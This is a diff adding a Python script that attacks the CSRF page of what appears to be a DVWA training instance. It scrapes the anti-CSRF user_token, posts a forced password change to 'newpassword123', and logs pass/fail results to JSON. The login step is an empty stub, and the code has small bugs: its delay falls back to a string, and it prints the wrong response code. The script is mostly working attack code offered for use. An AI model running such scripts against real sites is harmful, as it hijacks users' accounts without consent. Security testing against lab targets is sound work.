@@ -1,0 +1,92 @@
+import requests
+from bs4 import BeautifulSoup
+from datetime import datetime
+from pathlib import Path
+import os
+import json
+import sys
+import time
+
+# Setup directories and session
+logs_dir = Path('logs')
+logs_dir.mkdir(exist_ok=True)
+session = requests.Session()
+
+if len(sys.argv) > 2:
+    base_url = sys.argv[1]
+    request_rate = sys.argv[2]
+else:
+    print("Base URL and/or request rate were not provided.")
+    sys.exit(1)
+
+delays = {'low': 7, 'medium': 2, 'high': 0.5}
+delay = delays.get(request_rate, 'medium')
+
+csrf_url = f"{base_url}/vulnerabilities/csrf/"
+login_url = f"{base_url}/login.php"
+
+def login_and_setup_security():
+    # Existing login logic here
+    pass
+
+def csrf_attack():
+    total_tests = 0
+    tests_passed = 0
+    tests_failed = 0
+    details = []  # List to store result details for each command
+
+    # Get CSRF page for initial CSRF token
+    response = session.get(csrf_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value')
+
+    # Prepare the data for the CSRF attack (changing the password)
+    data = {
+        'password_new': 'newpassword123',
+        'password_conf': 'newpassword123',
+        'Change': 'Change',
+        'user_token': user_token
+    }
+    total_tests += 1
+    post_response = session.post(csrf_url, data=data)
+    response_code = post_response.status_code
+    success_condition = (200 <= response_code < 300)
+
+    if success_condition:
+        tests_passed += 1
+        result_status = f"PASSED - password changed successfully ! Response Code: {response_code}"
+    else:
+        tests_failed += 1
+        result_status = f"FAILED - Response Code not 200, got {response_code}"
+    print(f"User Token: {user_token}\nResult Status: {result_status}\nResponse Code: {response.status_code}")
+    time.sleep(delay)
+    
+    # Add command result details to the list
+    details.append({
+        "Token":user_token ,
+        "response_code": response_code,
+        "status": result_status
+    })
+
+    # Log the results
+    script_name = os.path.splitext(os.path.basename(__file__))[0]
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    file_name = f"results_{script_name}_{timestamp}.json"
+    results_file = logs_dir / file_name
+    result_summary = {
+        'date_time': timestamp,
+        'base_url': base_url,
+        'total_tests': total_tests,
+        'tests_passed': tests_passed,
+        'tests_failed': tests_failed,
+        'tested_url': csrf_url,
+        'details': details  # Include detailed command results in the JSON output
+    }
+    
+    with open(results_file, 'w') as f:
+        json.dump(result_summary, f, indent=4)
+    print(f"Results saved to {results_file}")
+
+if __name__ == "__main__":
+    login_and_setup_security()
+    csrf_attack()
